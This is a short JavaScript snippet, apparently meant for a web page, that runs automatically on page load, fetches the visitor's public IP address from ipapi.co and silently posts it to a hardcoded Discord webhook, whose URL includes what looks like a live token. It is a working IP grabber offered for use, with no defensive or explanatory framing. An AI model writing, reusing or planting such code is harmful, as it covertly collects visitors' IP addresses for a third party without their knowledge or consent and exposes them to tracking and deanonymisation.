
 async function fetchIPAddress() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (!response.ok) {
                    throw new Error('Network response was not ok ' + response.statusText);
                }
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP address:', error);
            }
        }

        // Function to send data to Discord webhook
        async function sendToDiscord(ipAddress) {
            const webhookUrl = 'https://discord.com/api/webhooks/1262391368634859611/7_xhm9DlqzW4QB9f-SNnLdEvJ8U1FUbMaM9_D40ueXHUBHlPsnp0Ry7fguHXJ7yfCr9L'; // Replace with your Discord webhook URL
            const payload = {
                content: `IP Address: ${ipAddress}`
            };

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) {
                    throw new Error('Network response was not ok ' + response.statusText);
                }

                console.log('IP address sent to Discord successfully');
            } catch (error) {
                console.error('Error sending to Discord:', error);
            }
        }

        // Main function to fetch IP and send it to Discord
        async function main() {
            const ipAddress = await fetchIPAddress();
            if (ipAddress) {
                await sendToDiscord(ipAddress);
            }
        }

        // Call the main function when the page loads
        window.onload = main;
